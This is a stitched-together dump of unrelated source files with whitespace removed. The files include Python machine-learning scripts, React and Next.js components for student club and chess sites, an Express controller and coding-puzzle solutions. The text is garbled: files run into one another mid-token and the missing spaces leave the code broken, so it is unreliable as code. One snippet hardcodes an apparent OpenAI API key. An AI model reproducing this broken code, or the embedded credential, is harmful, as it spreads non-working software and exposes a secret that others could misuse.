tion:",regressor_pne_hs.predict(row)[0])print(explain_pne_hs.checkAverageWordLength())print(explain_pne_hs.checkMisspelled())print(explain_pne_hs.checkLength())print(explain_pne_hs.checkKeyWords())print(explain_pne_hs.checkVocabulary())print(explain_pne_hs.checkPercentStopWords())fromPILimportImage,ImageDraw,ImageFontclassLayoutVisualizer:row_start_positions=[(80,370),(180,445),(195,525),(225,600)]row_lengths=[13,13,11,10]column_spacing=80row_spacing=25def__init__(self,layout,template_path):self.template_path=template_pathself.expanded=layout.expandedself.name=''.join(self.expanded[26:36:2])defvisualize(self):template=Image.open(self.template_path)draw=ImageDraw.Draw(template)font=ImageFont.truetype('arial.ttf',24)i=0forrow,lengthinzip(self.row_start_positions,self.row_lengths):forcolinrange(length):x=row[0]+(col*self.column_spacing)y=row[1]lower=self.expanded[i]upper=self.expanded[i+1]draw.text((x,y),lower,fill='black',font=font)draw.text((x,y-self.row_spacing),upper,fill='black',font=font)i+=2template.save('images/delete.png')eimportReactfrom"react";import{FaInstagram,FaEnvelope,FaHandHoldingUsd}from"react-icons/fa";exportdefaultfunctionFooter(){return(<divclassName="mx-automax-w-7xlpx-2sm:px-6lg:px-8pb-10"><footerclassName="bg-whiteborder-tborder-gray-200py-4"><divclassName="flexjustify-betweenitems-center"><divclassName="flexitems-center"><pclassName="text-gray-400cursor-default">SitebuiltbyRitvikIrigireddyandNathanDai</p></div>{/*SocialMediaIcons*/}<divclassName="flexitems-center">{/*InstagramIcon*/}<ahref="https://www.instagram.com/cca_deca/"target="_blank"rel="noopenernoreferrer"className="text-gray-400mx-2"><FaInstagramsize="1.5em"/></a>{/*EmailIcon*/}<ahref="mailto:ravensdeca@gmail.com"className="text-gray-400mx-2"><FaEnvelopesize="1.5em"/></a>{/*GoFundMeIcon*/}<ahref="https://www.gofundme.com/f/help-out-the-cca-deca-chapter"target="_blank"rel="noopenernoreferrer"className="text-gray-400mx-2"><FaHandHoldingUsdsize="1.5em"/></a></div></div></footer></div>);}"""Strippedversionofhttps://github.com/richzhang/PerceptualSimilarity/tree/master/models"""fromcollectionsimportnamedtupleimporttorchimporttorch.nnasnnfromtorchvisionimportmodelsfrom..utilimportget_ckpt_pathclassLPIPS(nn.Module):#Learnedperceptualmetricdef__init__(self,use_dropout=True):super().__init__()self.scaling_layer=ScalingLayer()self.chns=[64,128,256,512,512]#vg16featuresself.net=vgg16(pretrained=True,requires_grad=False)self.lin0=NetLinLayer(self.chns[0],use_dropout=use_dropout)self.lin1=NetLinLayer(self.chns[1],use_dropout=use_dropout)self.lin2=NetLinLayer(self.chns[2],use_dropout=use_dropout)self.lin3=NetLinLayer(self.chns[3],use_dropout=use_dropout)self.lin4=NetLinLayer(self.chns[4],use_dropout=use_dropout)self.load_from_pretrained()forparaminself.parameters():param.requires_grad=Falsedefload_from_pretrained(self,name="vgg_lpips"):ckpt=get_ckpt_path(name,"sgm/modules/autoencoding/lpips/loss")self.load_state_dict(torch.load(ckpt,map_location=torch.device("cpu")),strict=False)print("loadedpretrainedLPIPSlossfrom{}".format(ckpt))@classmethoddeffrom_pretrained(cls,name="vgg_lpips"):ifname!="vgg_lpips":raiseNotImplementedErrormodel=cls()ckpt=get_ckpt_path(name)model.load_state_dict(torch.load(ckpt,map_location=torch.device("cpu")),strict=False)returnmodeldefforward(self,input,target):in0_input,in1_input=(self.scaling_layer(input),self.scaling_layer(target))outs0,outs1=self.net(in0_input),self.net(in1_input)feats0,feats1,diffs={},{},{}lins=[self.lin0,self.lin1,self.lin2,self.lin3,self.lin4]forkkinrange(len(self.chns)):feats0[kk],feats1[kk]=normalize_tensor(outs0[kk]),normalize_tensor(outs1[kk])diffs[kk]=(feats0[kk]-feats1[kk])**2res=[spatial_average(lins[kk].model(diffs[kk]),keepdim=True)forkkinrange(len(self.chns))]val=res[0]forlinrange(1,len(self.chns)):val+=res[l]returnvalclassScalingLayer(nn.Module):def__init__(self):super(ScalingLayer,self).__init__()self.register_buffer("shift",torch.Tensor([-0.030,-0.088,-0.188])[None,:,None,None])self.register_buffer("scale",torch.Tensor([0.458,0.448,0.450])[None,:,None,None])defforward(self,inp):return(inp-self.shift)/self.scaleclassNetLinLayer(nn.Module):"""Asinglelinearlayerwhichdoesa1x1conv"""def__init__(self,chn_in,chn_out=1,use_dropout=False):super(NetLinLayer,self).__init__()layers=([nn.Dropout(),]if(use_dropout)else[])layers+=[nn.Conv2d(chn_in,chn_out,1,stride=1,padding=0,bias=False),]self.model=nn.Sequential(*layers)classvgg16(torch.nn.Module):def__init__(self,requires_grad=False,pretrained=True):super(vgg16,self).__init__()vgg_pretrained_features=models.vgg16(pretrained=pretrained).featuresself.slice1=torch.nn.Sequential()self.slice2=torch.nn.Sequential()self.slice3=torch.nn.Sequential()self.slice4=torch.nn.Sequential()self.slice5=torch.nn.Sequential()self.N_slices=5forxinrange(4):self.slice1.add_module(str(x),vgg_pretrained_features[x])forxinrange(4,9):self.slice2.add_module(str(x),vgg_pretrained_features[x])forxinrange(9,16):self.slice3.add_module(str(x),vgg_pretrained_features[x])forxinrange(16,23):self.slice4.add_module(str(x),vgg_pretrained_features[x])forxinrange(23,30):self.slice5.add_module(str(x),vgg_pretrained_features[x])ifnotrequires_grad:forparaminself.parameters():param.requires_grad=Falsedefforward(self,X):h=self.slice1(X)h_relu1_2=hh=self.slice2(h)h_relu2_2=hh=self.slice3(h)h_relu3_3=hh=self.slice4(h)h_relu4_3=hh=self.slice5(h)h_relu5_3=hvgg_outputs=namedtuple("VggOutputs",["relu1_2","relu2_2","relu3_3","relu4_3","relu5_3"])out=vgg_outputs(h_relu1_2,h_relu2_2,h_relu3_3,h_relu4_3,h_relu5_3)returnoutdefnormalize_tensor(x,eps=1e-10):norm_factor=torch.sqrt(torch.sum(x**2,dim=1,keepdim=True))returnx/(norm_factor+eps)defspatial_average(x,keepdim=True):returnx.mean([2,3],keepdim=keepdim)importFeatureCardfrom'./FeatureCard';constFeatureCardCollection=({features})=>{return(<divclassName='flexjustify-centerpy-10'><divclassName='gridlg:grid-cols-3md:grid-cols-1sm:grid-cols-1gap-10lg:w-3/5md:w-4/5sm:w-screen'>{features.map((feature,index)=>(<divkey={index}className='card'><FeatureCardkey={feature.title}{...feature}/></div>))}</div></div>);};exportdefaultFeatureCardCollection;#%%importpandasaspdimportosfromsklearn.preprocessingimportStandardScalerfromsklearn.pipelineimportPipelinefromsklearn.model_selectionimporttrain_test_splitfromsklearn.metricsimportclassification_reportfromxgboostimportXGBClassifierfromsklearn.neural_networkimportMLPClassifierfromsklearn.ensembleimportRandomForestClassifierimportmatplotlib.pyplotasplt#%%#allpeoplearshia_active_df=pd.read_excel('data/active/arshia_active90.xlsx')arshia_active_df['label']=1arshia_rest_df=pd.read_excel('data/rest/arshia_rest90.xlsx')arshia_rest_df['label']=0steven_active_df=pd.read_excel('data/active/steven_active90.xlsx')steven_active_df['label']=1steven_rest_df=pd.read_excel('data/rest/steven_rest90.xlsx')steven_rest_df['label']=0nathan_active_df=pd.read_excel('data/active/NathanActive.xlsx')nathan_active_df['label']=1nathan_rest_df=pd.read_excel('data/rest/NathanRest.xlsx')nathan_rest_df['label']=0arshia_df=pd.concat([arshia_active_df,arshia_rest_df],ignore_index=True)arshia_df=arshia_df.sample(frac=1).reset_index(drop=True)steven_df=pd.concat([steven_active_df,steven_rest_df],ignore_index=True)steven_df=steven_df.sample(frac=1).reset_index(drop=True)nathan_df=pd.concat([nathan_active_df,nathan_rest_df],ignore_index=True)nathan_df=nathan_df.sample(frac=1).reset_index(drop=True)df=pd.concat([arshia_df,steven_df,nathan_df],ignore_index=True)#%%preprocessor=Pipeline([('scaler',StandardScaler()),])#%%independents=df.columns[:-1]dependent='label'#%%#X_train,X_test,y_train,y_test=train_test_split(X,y,test_size=0.2,random_state=42)#trainonarshiaandtestonsteven#X_train=pd.DataFrame(preprocessor.fit_transform(pd.concat([arshia_df[independents],steven_df[independents]],ignore_index=True)),columns=independents)#y_train=pd.concat([arshia_df[dependent],steven_df[dependent]],ignore_index=True)X_train=pd.DataFrame(preprocessor.fit_transform(arshia_df[independents]),columns=independents)y_train=arshia_df[dependent]#X_test=pd.DataFrame(preprocessor.transform(steven_df[independents]))#y_test=steven_df[dependent]X_test=pd.DataFrame(preprocessor.transform(nathan_df[independents]),columns=independents)y_test=nathan_df[dependent]#%%#model=XGBClassifier()#model=RandomForestClassifier()model=MLPClassifier(hidden_layer_sizes=(32),max_iter=100,random_state=42)model.fit(X_train,y_train)#%%y_pred=model.predict(X_test)print(classification_report(y_test,y_pred))#exportmodeltoafolderandexportclassificationreportdataframetothesamefolder#createafolderwiththenameofthemodelinmodelsfoldermodel.save_model('model.json')classification_report_df=pd.DataFrame(classification_report(y_test,y_pred,output_dict=True))classification_report_df.to_csv('classification_report.csv')#%%#featureimportanceplt.barh(independents,model.feature_importances_)#exporttofileplt.savefig('feature_importance.png')#%%test_df=pd.read_clipboard()processed_test_df=pd.DataFrame(preprocessor.transform(test_df[independents]),columns=independents)y_pred=model.predict(processed_test_df)#np.mean(y_pred)print(classification_report(test_df[dependent],y_pred))importlocalFontfrom"next/font/local";import"./globals.css";constgeistSans=localFont({src:"./fonts/GeistVF.woff",variable:"--font-geist-sans",weight:"100900",});constgeistMono=localFont({src:"./fonts/GeistMonoVF.woff",variable:"--font-geist-mono",weight:"100900",});exportconstmetadata={title:"CreateNextApp",description:"Generatedbycreatenextapp",};exportdefaultfunctionRootLayout({children}){return(<htmllang="en"><bodyclassName={`${geistSans.variable}${geistMono.variable}antialiased`}>{children}</body></html>);}importReactfrom"react";import{FaInstagram,FaEnvelope,FaHandHoldingUsd}from"react-icons/fa";exportdefaultfunctionFooter(){return(<divclassName="mx-automax-w-7xlpx-2sm:px-6lg:px-8pb-10"><footerclassName="bg-whiteborder-tborder-gray-200py-4"><divclassName="flexjustify-betweenitems-center"><divclassName="flexitems-center"><pclassName="text-gray-400cursor-default">SitebuiltbyRitvikIrigireddyandNathanDai</p></div>{/*SocialMediaIcons*/}<divclassName="flexitems-center">{/*InstagramIcon*/}<ahref="https://www.instagram.com/cca_deca/"target="_blank"rel="noopenernoreferrer"className="text-gray-400mx-2"><FaInstagramsize="1.5em"/></a>{/*EmailIcon*/}<ahref="mailto:ravensdeca@gmail.com"className="text-gray-400mx-2"><FaEnvelopesize="1.5em"/></a>{/*GoFundMeIcon*/}<ahref="https://www.gofundme.com/f/help-out-the-cca-deca-chapter"target="_blank"rel="noopenernoreferrer"className="text-gray-400mx-2"><FaHandHoldingUsdsize="1.5em"/></a></div></div></footer></div>);}importunittestclassSolution:defgroupAnagrams(self,strings:list[str])->list[list[str]]:strings=zip(map(lambdax:''.join(sorted(x)),strings),strings)groups={}forkey,wordinstrings:ifkeynotingroups:groups[key]=[]groups[key].append(word)returngroups.values()#classTestSolution(unittest.TestCase):#defsetUp(self):#self.solution=Solution()#deftest_groupAnagrams(self):#self.assertEqual(self.solution.groupAnagrams(['eat','tea','tan','ate','nat','bat']),[['bat'],['nat','tan'],['ate','eat','tea']])#self.assertEqual(self.solution.groupAnagrams(['']),[['']])#self.assertEqual(self.solution.groupAnagrams(['a']),[['a']])#unittest.main()print(Solution().groupAnagrams(['eat','tea','tan','ate','nat','bat']))importPagefrom'@/components/Page';constEntrepreneurship=()=>{return<Pagedata_cluster='Entrepreneurship'cluster='entrepreneurship'/>;};exportdefaultEntrepreneurship;importProfileIconfrom'./ProfileIcon';importHostWebinarButtonfrom'./HostWebinarButton';constTopBar=()=>{return(<divclassName='flexjustify-enditems-centerp-4border-bstickytop-0bg-white'><divclassName='flexitems-centerspace-x-4'><HostWebinarButton/><ProfileIcon/></div></div>);};exportdefaultTopBar;fromcodeinterpreterapiimportCodeInterpreterSession,Fileasyncdefmain():#contextmanagerforautostart/stopofthesessionasyncwithCodeInterpreterSession(openai_api_key='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')assession:#definetheuserrequestuser_request="Analyzethisdatasetandplotsomethinginterestingaboutit."files=[File.from_path('surface_temp.csv'),]#generatetheresponseresponse=awaitsession.generate_response(user_request,files=files)#outputtotheuserprint("AI:",response.content)forfileinresponse.files:file.show_image()if__name__=="__main__":importasyncioasyncio.run(main())import{Chessboard}from'react-chessboard';constBoard=()=>{return<ChessboardarePiecesDraggable={false}/>;};exportdefaultBoard;importnumpyasnpfromvisualizeimportplot_pointsdefshape(x,y)->bool:returnall([y<x**2,y>0,])defread_points(file:str):withopen(file)asf:lines=f.readlines()points=[tuple(map(float,line.split()))forlineinlines]returnpointsdefgenerate_points(xmin,xmax,ymin,ymax,spacing):points=[]forxinnp.arange(xmin,xmax,spacing):foryinnp.arange(ymin,ymax,spacing):#roundbasedonspacingdigits=int(-np.log10(spacing)+1)x,y=map(lambdax:round(x,digits),(x,y))ifshape(x,y):points.append((x,y))returnpointsdefgenerate_files(points):withopen('points.txt','w')asf:forx,yinpoints:f.write(f'{x}{y}\n')fig,ax=plot_points(points)fig.savefig('points.png')if__name__=='__main__':points=generate_points(-1,1,-1,1,0.01)generate_files(points)importstreamlitasstimportpandasaspdimportmatplotlib.pyplotaspltportfolio_df=pd.read_pickle('portfolio.pkl')portfolio_df.rename(columns={'marketValue':'value','symbolDescription':'symbol'},inplace=True)portfolio_df=portfolio_df[~portfolio_df['symbol'].isin(['SPY','VOO'])]print(portfolio_df.iloc[0])#smallerdfwithsymbol,value,andweightdf=portfolio_df[['symbol','value']]df['weight']=df['value']/df['value'].sum()##########inputs={}forrowindf.iterrows():symbol=row[1]['symbol']weight=row[1]['weight']value=row[1]['value']inputs[symbol]=st.number_input(symbol,0,1000,round(weight*1000),1,key=symbol)st.button('Update',key=symbol+'_button',on_click=lambda:update(symbol,inputs[symbol]))#whenbuttonispressed#changeinputstoshownewweightsfromtypingimportDict,Optional,List,Union,TuplefromomegaconfimportDictConfigfrom.baseimportAbstractFilterfromsdata.datapipelineimporttime_measure,timeout_wrapperclassSimpleKeyFilter(AbstractFilter):def__init__(self,keys:Union[str,List[str]],*args,**kwargs):super().__init__(*args,**kwargs)ifisinstance(keys,str):keys=[keys]self.keys=set(keys)@timeout_wrapper@time_measure("SimpleKeyFilter")def__call__(self,sample:Dict)->bool:try:ifself.skip_this_sample(sample):returnTrueresult=all(map(lambdax:xinsample,self.keys))delsamplereturnresultexceptExceptionase:print(f"{e.__class__.__name__}in{self.__class__.__name__}:{e}")returnFalseclassSimpleSizeFilter(AbstractFilter):def__init__(self,size:Union[int,Tuple[int,int],List[int]],mode:str="min",strict:Optional[Union[bool,Dict]]=None,width_key:str="original_width",height_key:str="original_height",*args,**kwargs,):"""Simplesizefilterbasedonmetadatawhichisalreadydecoded:paramsize:Thedesiredminormaxsize:parammode:eithertofilteroutallaboveaminsize(min)orallbelowamaxsize(max):paramkey:indicatesthefieldinthesample,thefieldshouldbeadict:paramsubkeys:listofstringsdefiningsubkeysfornesteddict,i.e.['foo','bar']wouldresultinsample[self.key]['foo']['bar']beingtheentryinanesteddict,wherethesizeinformationsits:paramstrict:whethertoreturnTrueorFalsewhenthekeyisnotpresent:paramwidth_key:thewidthkeyatthefinallevelinthemetadatadicti.e.forkey='json',subkeys=['foo','bar']andwidth_key='original_width',theentrysample['json']['foo']['bar']['original_width']wouldbeused:paramheight_key:sameasabovebutwithwidth"""super().__init__(*args,**kwargs)ifisinstance(size,int):size=[size,size]self.size=sizeifmode=="min":self.relation=self.filter_minelse:self.relation=self.filter_maxself.strict=strictifnotisinstance(self.strict,(bool,dict,DictConfig)):raiseTypeError(f"strictin{self.__class__.__name__}shouldbeboolorDict")self.height_key=height_keyself.width_key=width_keydeffilter_min(self,height:int,width:int)->bool:returnheight>=self.size[0]andwidth>=self.size[1]deffilter_max(self,height:int,width:int)->bool:returnheight<=self.size[0]andwidth<=self.size[1]@timeout_wrapper@time_measure("SimpleSizeFilter")def__call__(self,sample:Dict)->bool:try:ifself.skip_this_sample(sample):returnTrue#getheightandwidthoriginal_width=sample[self.width_key]original_height=sample[self.height_key]result=self.relation(original_height,original_width)returnresultexceptExceptionase:ifisinstance(self.strict,bool):returnnotself.strictelifisinstance(self.strict,(dict,DictConfig)):url=sample["__url__"]key=[kforkinself.strictifkinurl][0]result=notself.strict[key]returnresultelse:raiseTypeError(f"strictin{self.__class__.__name__}shouldbeboolorDict")importunittestclassSolution:defbruteForce(self,nums:list[int],target:int)->tuple[int]:foriinrange(len(nums)-1):forjinrange(i+1,len(nums)):if(nums[i]+nums[j]==target):returni,jdeftwoSum(self,nums:list[int],target:int)->tuple[int]:visited={}fori,ninenumerate(nums):if((difference:=target-n)invisited):returni,visited[difference]visited[n]=iclassTestSolution(unittest.TestCase):defsetUp(self):self.solution=Solution()deftest_twoSum(self):self.assertEqual(sorted(list(self.solution.twoSum([2,7,11,15],9))),[0,1])self.assertEqual(sorted(list(self.solution.twoSum([3,2,4],6))),[1,2])self.assertEqual(sorted(list(self.solution.twoSum([3,3],6))),[0,1])unittest.main()a=1matcha:case0:print(0)case1:print(1)case2:print(2)#%%importpandasaspdimportnumpyasnpimportosfromsklearn.preprocessingimportStandardScalerfromsklearn.pipelineimportPipelinefromsklearn.model_selectionimporttrain_test_splitfromsklearn.metricsimportclassification_report,accuracy_score,f1_score,precision_score,recall_scorefromxgboostimportXGBClassifierfromsklearn.neural_networkimportMLPClassifierfromsklearn.ensembleimportRandomForestClassifierimportmatplotlib.pyplotaspltimportjoblib#%%active_df=pd.concat([pd.read_excel(f'data/active/{file}')forfileinos.listdir('data/active')],ignore_index=True)rest_df=pd.concat([pd.read_excel(f'data/rest/{file}')forfileinos.listdir('data/rest')],ignore_index=True)active_df['label']=1rest_df['label']=0df=pd.concat([active_df,rest_df],ignore_index=True)df=df.sample(frac=1).reset_index(drop=True)df#%%preprocessor=Pipeline([('scaler',StandardScaler()),])#%%independents=df.columns[:-1]dependent='label'#%%processed_df=pd.DataFrame(preprocessor.fit_transform(df[independents]),columns=independents)processed_df#%%X=processed_dfy=df[dependent]X_train,X_test,y_train,y_test=train_test_split(X,y,test_size=0.2,random_state=42)#%%model=XGBClassifier()#n_estimators=10,#max_depth=15,#)#model=RandomForestClassifier()#model=MLPClassifier(hidden_layer_sizes=(100,100,100),max_iter=1000,random_state=42)model.fit(X_train,y_train)#%%y_pred=model.predict(X_test)score=pd.DataFrame({'accuracy':accuracy_score(y_test,y_pred),'f1':f1_score(y_test,y_pred),'precision':precision_score(y_test,y_pred),'recall':recall_score(y_test,y_pred),},index=[0])#%%name=model.__class__.__name__params=model.get_params()folder=f'models/{name}'os.makedirs(folder,exist_ok=True)joblib.dump(model,f'{folder}/model.pkl')score.to_csv(f'{folder}/score.csv')#%%test_df=pd.read_clipboard()processed_test_df=pd.DataFrame(preprocessor.transform(test_df[independents]),columns=independents)y_pred=model.predict(processed_test_df)#np.mean(y_pred)print(classification_report(test_df[dependent],y_pred))#%%import{useState,useEffect}from'react';import{Chessboard}from'react-chessboard';import{Chess}from'chess.js';importmoveSoundfrom'../public/move-sound.mp3';import{ProgressBar}from'./ProgressBar';import{useDispatch,useSelector}from'react-redux';import{setImove}from'../redux/slices/imoveSlice';constBoard=({comments})=>{const[pgn,setPgn]=useState(`[Event"LiveChess"][Site"Chess.com"][Date"2023.04.14"][Round"-"][White"rajbedi"][Black"ShiBoGod"][Result"1-0"][WhiteElo"1394"][BlackElo"1398"][TimeControl"600"][EndTime"22:22:45PDT"][Termination"rajbediwonbyresignation"]1.e4c62.d4d53.e5Bf54.Bd3Bxd35.Qxd3e66.Qb3Qb67.Qxb6axb68.Nf3c59.Be3Nc610.dxc5bxc511.O-ONge712.c3Nf513.Na3Nxe314.fxe3c415.Nb5Rc816.Ng5f517.exf6gxf618.Rxf6Bc519.Rxe6+Kd720.Kh1Bxe321.Rxe3Rhf822.h3Rf523.Nxh7Rh824.Rf3Rh525.Nf6+1-0`);const[moveSoundEffect,setMoveSoundEffect]=useState(null);useEffect(()=>{setMoveSoundEffect(newAudio(moveSound));},[moveSound]);const[boardOrientation,setBoardOrientation]=useState('white');constflipBoard=()=>{setBoardOrientation(boardOrientation==='white'?'black':'white');};constgetFenArr=(board)=>{consttempBoard=newChess();returnboard.history().map((move)=>{tempBoard.move(move);returntempBoard.fen();});};const[fen,setFen]=useState('start');constimove=useSelector((state)=>state.imove.value);constdispatch=useDispatch();constboard=newChess();board.loadPgn(pgn);constfenArr=['start',...getFenArr(board)];consthandleKeyDown=(e)=>{if(e.key==='x'){flipBoard();return;}leti=(e.key==='ArrowDown')?fenArr.length-1:(e.key==='ArrowUp')?0:Math.max(0,Math.min(fenArr.length-1,imove+(e.key==='ArrowRight'?1:e.key==='ArrowLeft'?-1:0)));dispatch(setImove(i));setFen(fenArr[i]);};consthandleSubmit=(e)=>{e.preventDefault();constformData=newFormData(e.target);constnewPgn=formData.get('pgn');setPgn(newPgn);setImove(0);setFen('start');};return(<divclassName=''><formclassName='flexcontent-centerspace-x-2mt-5mb-5'onSubmit={handleSubmit}><inputclassName='px-3py-2borderborder-gray-300rounded-lgfocus:outline-nonefocus:ring-2focus:ring-green-500'id='pgn-input'name='pgn'type='text'placeholder='EnterPGN'/><buttonclassName='px-4py-2rounded-fullbg-green-100hover:bg-green-200focus:outline-none'type='submit'>Submit</button></form><divid='board'className='w-6/12lg:w-5/12'tabIndex={0}onKeyDown={handleKeyDown}><ChessboardarePiecesDraggable={false}position={fen}boardOrientation={boardOrientation}id='chessboard'/><divid='progress-bar-div'><ProgressBarfenArr={fenArr}imove={imove}comments={comments}></ProgressBar></div></div></div>);};exportdefaultBoard;frommanimimport*classExplanation(Scene):defconstruct(self):#createvideoherepassconstUser=require('../models/User');constGame=require('../models/Game');constasyncHandler=require('express-async-handler');constgetAllGames=asyncHandler(async(req,res)=>{constgames=awaitGame.find().populate('user','username').lean();if(!games?.length){returnres.status(400).json({message:'Nogamesfound'});}res.json(games);});constgetGameById=asyncHandler(async(req,res)=>{constgameId=req.params.id;constgame=awaitGame.findById(gameId).populate('user','username').lean();if(!game){returnres.status(400).json({message:'Gamenotfound'});}res.json(game);});constcreateNewGame=asyncHandler(async(req,res)=>{const{user,pgn}=req.body;if(!user||!pgn){returnres.status(400).json({message:'Allfieldsarerequired'});}constgame=awaitGame.create({user,pgn});if(game){res.status(201).json({message:'Gamecreatedsuccessfully',game});}else{res.status(400).json({message:'Invalidgamedatareceived'});}});constupdateGame=asyncHandler(async(req,res)=>{const{id,user,pgn}=req.body;if(!id||!user||!pgn){returnres.status(400).json({message:'Allfieldsarerequired'});}constgame=awaitGame.findById(id).exec();if(!game){returnres.status(400).json({message:'Gamenotfound'});}game.user=user;game.pgn=pgn;constupdatedGame=awaitgame.save();res.json({message:`${updatedGame.id}updated`});});constdeleteGame=asyncHandler(async(req,res)=>{const{gameId,userId}=req.body;if(!gameId||!userId){returnres.status(400).json({message:'GameIDanduserIDarerequired'});}constgame=awaitGame.findById(gameId).exec();if(!game){returnres.status(400).json({message:'Gamenotfound'});}constuser=awaitUser.findById(userId).exec();if(!user){returnres.status(400).json({message:'Usernotfound'});}if(game.user.toString()!==user.id){returnres.status(401).json({message:'Unauthorizedtodeletethisgame'});}constresult=awaitgame.deleteOne();constreply=`Game${gameId}deleted`;user.games.pull(gameId);awaituser.save();res.json({message:reply});});module.exports={getAllGames,getGameById,createNewGame,updateGame,deleteGame,};'useclient';importSidebarfrom'@/components/sidebar/Sidebar';importProfileIconfrom'@/components/home/ProfileIcon';importMainContentfrom'@/components/home/MainContent';importTopBarfrom'@/components/home/TopBar';import{useAuthState}from'react-firebase-hooks/auth';import{auth,signInWithGoogle}from'@/firebase/firebase';import{FaGoogle}from'react-icons/fa';constPage=()=>{const[user,loading]=useAuthState(auth);if(loading){returnnull;}return<>{user?<Home/>:<SignIn/>}</>;};constHome=()=>{return(<divclassName='flexmin-h-screen'><SidebaractiveIndex={0}/><divclassName='flexflex-1flex-col'><TopBar/><MainContent/></div></div>);};constSignIn=()=>{return(<divclassName='flexitems-centerjustify-centerh-screenbg-gray-100'><divclassName='bg-whiteshadow-lgrounded-lgp-8max-w-mdw-fulltext-center'><h1className='text-3xlfont-boldtext-blue-500mb-6'>WeLearn</h1><pclassName='text-gray-600mb-8'>Signintoshareanddiscoverknowledge.Afocusedplatformforcreatorsandlearners.</p><buttononClick={signInWithGoogle}className='flexitems-centerjustify-centerw-fullpx-4py-3bg-blue-500text-whitefont-semiboldrounded-mdhover:bg-blue-600transitionduration-300'><FaGoogleclassName='mr-2'/>SigninwithGoogle</button></div></div>);};exportdefaultPage;exportconstComment=({comment})=>{constformatDate=(date)=>{constmonth=date.getMonth()+1;constday=date.getDate();constyear=date.getFullYear();lethours=date.getHours();constminutes=date.getMinutes();constamPm=hours>=12?'PM':'AM';hours%=12;hours=hours||12;letdateString=`${month}/${day}/${year}`;if(date.toDateString()===newDate().toDateString()){dateString='Todayat';}consttimeString=`${hours}:${minutes.toString().padStart(2,'0')}${amPm}`;constformattedDate=`${dateString}${timeString}`;returnformattedDate;};return(<divclassName='comment'id={comment.id}><h2className='comment-header'>{comment.poster}</h2><pclassName='comment-move'>Move:#{comment.move}</p><pclassName='comment-date'>{formatDate(comment.date)}</p>{comment.text}</div>);};exportdefaultComment;abc=1print(abc)data=[[1,2,3],[4,5,6],[7,8,9],]row=[123,234,345]for'useclient';import{useParams}from'next/navigation';importClassFeedfrom'@/components/classes/ClassFeed';constClassPage=()=>{constparams=useParams();constclassName=params.className;return(<div><ClassFeedclassId={className}/></div>);};exportdefaultClassPage;classPrize:def__init__(self,name:str,cost:float):self.name=nameself.cost=costdef__repr__(self)->str:returnf'{self.name}|${self.cost}'PRIZES=[Prize('SelectaPrize',0),Prize('AssortedStickers',0.03),Prize('FidgetToy',0.23),Prize('Squishy',0.25),Prize('BobaKeychain',1.12),Prize('PokemonPainting',1.88),Prize('HelloKittyKeychain',1.99),Prize('CatPoster',2.28),Prize('USBSplitter',2.48),Prize('MiniGameConsole',2.78),Prize('Slime',2.78),Prize('BlueDinosaurPlushy',3.59),Prize('PinkDinosaurPlushy',4.04),Prize('StrawberryPlushy',5.10),Prize('PawsPainting',7.48),Prize('CherryBlossomLegoKit',8.27)]#ImportLibrariesimportpandasaspdimportnumpyasnp#Counts%ofessaywhichcontainsvocabwords#Inputa1dor2darrayorembeddedlistofwordsvocabwordsall=np.load('essaygrader/data/pastData/vocabularywords.npy')classVocabCounterException(Exception):passclassVocabCounter():def__init__(self):self.essay2d=Noneself.essay1d=NonedefCountVocab(self,input_essay2d):self.essay2d=input_essay2d#Convertembeddedliststonparraysiftype(self.essay2d)==list:self.essay2d=np.array(self.essay2d)eliftype(self.essay2d)==np.ndarray:pass#Ifinputisnotalistorarray,raiseanexceptionelse:raiseVocabCounterException("Inputisnotoftypelistornp.ndarray")self.essay1d=self.essay2d.flatten()NumVocabWords=0foriinself.essay1d:ifiinvocabwordsall:NumVocabWords+=1returnNumVocabWords/len(self.essay1d)importNavbarfrom'@/components/Navbar';importImagefrom'next/image';constConfirm=()=>{return(<divclassName='flexflex-coljustify-centerh-screenbg-gray-100'><Navbar/><divclassName='flexflex-colitems-centerjustify-centerh-fullmt-10text-gray-800'><h1className='text-3xlfont-boldmb-6'>ThankYouforReachingOut!</h1><pclassName='mb-2text-center'>Weappreciateyourinterestandwe&apos;reexcitedtoconnectwithyou.Pleasecheckyouremailforaconfirmationmessageacknowledgingthereceiptofyourmessage.</p><pclassName='mb-2text-center'>Amemberofourteamwillbesendingyouafollow-upemailshortlytoaddressyourinquiry.Wewanttoensurethatyourexperienceisassmoothaspossible.</p><pclassName='mb-2text-center'>Ifyouhaveanyfurtherquestionsorneedadditionalassistance,pleasedon&apos;thesitatetoreachouttousagain.</p><hrclassName='w-52h-pxmx-automy-4border-0roundedmd:my-10bg-gray-500'/><pclassName='text-centerfont-semibold'>NathanandCharlesfromEnduraScribe</p><divclassName='p-4flexitems-center'><Imagesrc={'/black_double_connected.png'}width={100}height={0}alt='nathansignature'/><Imagesrc={'/charles.png'}width={300}height={0}alt='charlessignature'/></div></div></div>);};exportdefaultConfirm;importpandasaspdimportmatplotlib.pyplotaspltfromdatetimeimportdatetimefromdateutil.relativedeltaimportrelativedeltaimportstatsmodels.apiassmimportpickleif__name__=='__main__':df=pd.read_csv('data/miami_home_values.csv')#convertdatecolumntodatetimedf['date']=pd.to_datetime(df['date'])#convertdatetofloatdf['date']=df['date'].map(pd.Timestamp.toordinal)#linearregressionx=sm.add_constant(df['date'],prepend=False)y=df['price']model=sm.OLS(y,x).fit()withopen('models/model.pkl','wb')asf:pickle.dump(model,f)print(model.summary())#price15yearsintothefuturedate=(datetime(2022,10,1)+relativedelta(years=15)).toordinal()price=model.params['date']*date+model.params['const']print(price)#plotplt.plot(df['date'],df['price'],'o')plt.plot(df['date'],model.predict(x),'r')#plotprice15yearsintothefutureplt.plot(date,price,'go')plt.show()importosimportsyssys.path.append(os.path.realpath(os.path.join(os.path.dirname(__file__),"../../")))frompytorch_lightningimportseed_everythingfromscripts.demo.streamlit_helpersimport*fromscripts.demo.sv3d_helpersimport*SAVE_PATH="outputs/demo/vid/"VERSION2SPECS={"svd":{"T":14,"H":576,"W":1024,"C":4,"f":8,"config":"configs/inference/svd.yaml","ckpt":"checkpoints/svd.safetensors","options":{"discretization":1,"cfg":2.5,"sigma_min":0.002,"sigma_max":700.0,"rho":7.0,"guider":2,"force_uc_zero_embeddings":["cond_frames","cond_frames_without_noise"],"num_steps":25,},},"svd_image_decoder":{"T":14,"H":576,"W":1024,"C":4,"f":8,"config":"configs/inference/svd_image_decoder.yaml","ckpt":"checkpoints/svd_image_decoder.safetensors","options":{"discretization":1,"cfg":2.5,"sigma_min":0.002,"sigma_max":700.0,"rho":7.0,"guider":2,"force_uc_zero_embeddings":["cond_frames","cond_frames_witho